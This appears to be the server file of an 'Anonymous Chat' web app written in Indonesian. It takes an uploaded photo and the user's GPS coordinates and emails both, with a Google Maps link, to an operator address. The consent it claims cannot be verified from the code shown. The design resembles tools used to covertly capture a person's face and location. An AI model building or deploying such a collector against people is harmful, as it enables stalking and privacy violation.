require("dotenv").config();

const express = require("express");
const multer = require("multer");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 3000;

const upload = multer({
    storage: multer.memoryStorage(),
    limits: {
        fileSize: 8 * 1024 * 1024
    }
});

const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT),
    secure: process.env.SMTP_SECURE === "true",

    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

app.use(express.static(
    path.join(__dirname, "public")
));

app.post(
    "/api/consented-data",
    upload.single("photo"),
    async (req, res) => {

        try {

            const {
                latitude,
                longitude,
                accuracy,
                timestamp
            } = req.body;

            if (!req.file) {
                return res.status(400).json({
                    success: false,
                    message: "Foto tidak tersedia."
                });
            }

            if (
                latitude === undefined ||
                longitude === undefined
            ) {
                return res.status(400).json({
                    success: false,
                    message: "Lokasi tidak tersedia."
                });
            }

            const mapLink =
                `https://www.google.com/maps?q=${latitude},${longitude}`;

            const mail = {
                from: process.env.SMTP_USER,
                to: process.env.MAIL_TO,

                subject:
                    "Data Anonymous Chat — berdasarkan persetujuan",

                text:
`Data diterima setelah pengguna memberikan persetujuan.

Waktu:
${timestamp || new Date().toISOString()}

Latitude:
${latitude}

Longitude:
${longitude}

Akurasi:
${accuracy || "Tidak tersedia"} meter

Google Maps:
${mapLink}
`,

                attachments: [
                    {
                        filename:
                            "anonymous-chat-photo.jpg",

                        content:
                            req.file.buffer,

                        contentType:
                            req.file.mimetype
                    }
                ]
            };

            await transporter.sendMail(mail);

            res.json({
                success: true,
                message: "Data berhasil diproses."
            });

        } catch (error) {

            console.error(
                "EMAIL ERROR:",
                error
            );

            res.status(500).json({
                success: false,
                message: "Gagal mengirim data."
            });
        }
    }
);

app.get("/api/health", (req, res) => {
    res.json({
        status: "online"
    });
});

module.exports = app;